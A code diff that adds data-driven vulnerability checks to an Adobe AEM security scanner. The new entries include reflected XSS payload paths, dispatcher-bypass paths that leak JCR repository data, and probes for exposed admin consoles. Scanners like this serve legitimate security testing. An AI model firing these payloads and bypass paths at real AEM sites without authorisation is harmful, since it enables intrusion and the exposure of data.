@@ -337,6 +337,51 @@ SWF_XSS_PATHS = [
 ]
 
 # ---------------------------------------------------------------------------
+# Data-driven path checks ported from projectdiscovery/nuclei-templates (the
+# http/misconfiguration/aem/* set) and Cappricio-Securities/aem-xss. Each entry:
+#   (path, [words — ALL must appear in body], severity, category, title)
+# Word matchers are taken verbatim from the nuclei templates' matchers.
+# ---------------------------------------------------------------------------
+NUCLEI_PATH_CHECKS: List[Tuple[str, List[str], str, str, str]] = [
+    # --- Reflected XSS (aem-xss + nuclei) ---
+    ("/aemhntr<img src=x data'a'onerror=alert(domain)>.childrenlist.html",
+     ['<img src="x" data onerror="alert(domain)"/>'], SEV_MEDIUM, CAT_XSS,
+     "ChildrenList selector reflected XSS"),
+    ("/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html",
+     ["<svg onload=alert(document.domain)>"], SEV_MEDIUM, CAT_XSS,
+     "ChildrenList JSON-selector reflected XSS"),
+    ("/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a",
+     ["<svg/onload=confirm(document.domain);>"], SEV_MEDIUM, CAT_XSS,
+     "CRXDE setPreferences reflected XSS"),
+    # --- Servlet exposure / info disclosure ---
+    ("/libs/dam/merge/metadata.html?path=/etc&.ico", ["assetPaths"], SEV_MEDIUM, CAT_DISCLOSURE,
+     "MergeMetadataServlet exposed"),
+    ("/system/bgservlets/test.css", ["Flushing output"], SEV_MEDIUM, CAT_EXPOSURE,
+     "BackgroundServlet exposed"),
+    ("/etc/importers/bulkeditor.html", ["<title>AEM BulkEditor</title>"], SEV_LOW, CAT_EXPOSURE,
+     "BulkEditor console exposed"),
+    ("/libs/granite/security/content/useradmin.html", ["AEM Security | Users"], SEV_MEDIUM, CAT_EXPOSURE,
+     "Security User Admin console exposed"),
+    ("/libs/granite/offloading/content/view.html", ["Offloading Browser"], SEV_LOW, CAT_EXPOSURE,
+     "Offloading Browser exposed"),
+    ("/miscadmin", ["<title>AEM Tools</title>"], SEV_LOW, CAT_EXPOSURE,
+     "miscadmin console exposed"),
+    ("/libs/cq/ui/content/dumplibs.html", ["<title>Client Libraries</title>"], SEV_LOW, CAT_DISCLOSURE,
+     "ClientLibraries dump (dumplibs) exposed"),
+    ("/libs/granite/ui/content/dumplibs.test.html", ["Client Libraries Test Output"], SEV_LOW, CAT_DISCLOSURE,
+     "ClientLibraries test output exposed"),
+    ("/crx/explorer/nodetypes/index.jsp", ["Registered Node Types"], SEV_LOW, CAT_EXPOSURE,
+     "CRX node-types admin exposed"),
+    # --- Dispatcher-bypass JCR leak via Forms validator (nuclei aem-secrets) ---
+    ("//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json",
+     ['"jcr:uuid"', '"jcr:createdBy"'], SEV_HIGH, CAT_DISCLOSURE,
+     "Forms-validator dispatcher-bypass JCR leak"),
+    ("/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json",
+     ['"jcr:uuid"', '"jcr:createdBy"'], SEV_HIGH, CAT_DISPATCHER,
+     "Forms-validator dispatcher-bypass JCR leak (..;/)"),
+]
+
+# ---------------------------------------------------------------------------
 # Out-of-band SSRF detector (ported from aem-hacker). When --ssrf-callback is
 # given, a tiny HTTP listener records callbacks; SSRF servlets are told to fetch
 # http://<callback>/<token>/<servletkey>/<id>/ and a hit confirms blind SSRF.
@@ -2824,6 +2869,38 @@ class AEMHunter:
                 break
 
     # =======================================================================
+    # 18b. Data-driven path checks (nuclei-templates AEM set + aem-xss)
+    # =======================================================================
+    def check_nuclei_paths(self) -> None:
+        if not self._enabled("nuclei"):
+            return
+        self.logger.section("Nuclei-derived path checks (XSS / exposed servlets)")
+
+        def probe(entry):
+            path, words, sev, cat, title = entry
+            r = self.client.get(path)
+            if r is None or self._is_authwall(r):
+                return
+            body = r.text or ""
+            if not body:
+                return
+            if all(w in body for w in words):
+                self.reporter.add(Finding(
+                    title=f"{title} {self._role_tag()}",
+                    severity=sev, category=cat, target=self.target + path,
+                    evidence="Matched: " + " & ".join(w[:48] for w in words),
+                    description=("Detection ported from projectdiscovery/nuclei-templates "
+                                 "(AEM set) / Cappricio-Securities/aem-xss. For XSS findings, "
+                                 "confirm the payload renders in a browser."),
+                    references=["https://github.com/projectdiscovery/nuclei-templates",
+                                "https://github.com/Cappricio-Securities/aem-xss"],
+                    request=self.client.request_signature("GET", path),
+                    response_snippet=snippet(body, 300), role=self.role))
+
+        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
+            list(ex.map(probe, NUCLEI_PATH_CHECKS))
+
+    # =======================================================================
     # 19. ACS AEM Tools 'Fiddle' RCE (JSP eval) — ported from aem-hacker
     # =======================================================================
     def check_acs_fiddle(self) -> None:
@@ -2993,6 +3070,7 @@ class AEMHunter:
             self.check_sling_post_servlet()
             self.check_source_disclosure()
             self.check_aemhacker_servlets()
+            self.check_nuclei_paths()
             self.check_acs_fiddle()
             self.check_externaljob_deser()
             self.check_ssrf_oob()
